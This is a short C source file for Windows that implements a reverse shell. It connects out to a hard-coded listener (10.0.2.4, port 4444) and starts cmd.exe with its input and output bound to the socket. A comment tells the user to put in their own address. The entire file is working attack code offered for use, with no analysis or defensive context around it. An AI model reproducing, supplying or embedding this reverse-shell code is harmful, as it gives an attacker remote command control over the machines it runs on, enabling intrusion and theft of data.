#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib");

WSADATA socketDATA ; 
SOCKET mainSocket ; 
struct sockaddr_in connection_adr ; 
STARTUPINFO startup_info ;
PROCESS_INFORMATION P_info ; 

int main(void) {
	/* *******************************
   	   *******************************
   	   * change the address to yours *  
  	   *******************************	
   	   *******************************   */
	char *Listener_IP = "10.0.2.4" ; 
	short Listener_PORT = 4444 ;
	// Initializing and creating address socket :: 
	int iresult = WSAStartup(MAKEWORD(2,2) ,&socketDATA) ;
       	if (iresult != 0 ){
		printf("socket startup failed !! ") ;
		return -1 ; 
	};

	mainSocket = WSASocket(AF_INET , SOCK_STREAM , IPPROTO_TCP ,NULL, (unsigned int)NULL ,(unsigned int)NULL ) ;
        connection_adr.sin_family = AF_INET ; 
	connection_adr.sin_port = htons(Listener_PORT) ; 
	connection_adr.sin_addr.s_addr = inet_addr(Listener_IP) ; 
	// Establishing remote connection with the host :: 
	WSAConnect(mainSocket,(SOCKADDR*)&connection_adr,sizeof(connection_adr),NULL,NULL,NULL,NULL) ;
	// startup_info as the standard input , putput and error for the mainsocket
	memset(&startup_info ,0,sizeof(startup_info)) ; 
	startup_info.cb = sizeof(startup_info) ; 
	startup_info.dwFlags = STARTF_USESTDHANDLES ; 
	startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE) mainSocket ; 
	
	// initiate cmd.exe :: 
	CreateProcess(NULL,"cmd.exe" , NULL,NULL,TRUE,0,NULL,NULL,&startup_info,&P_info);
}	
        	




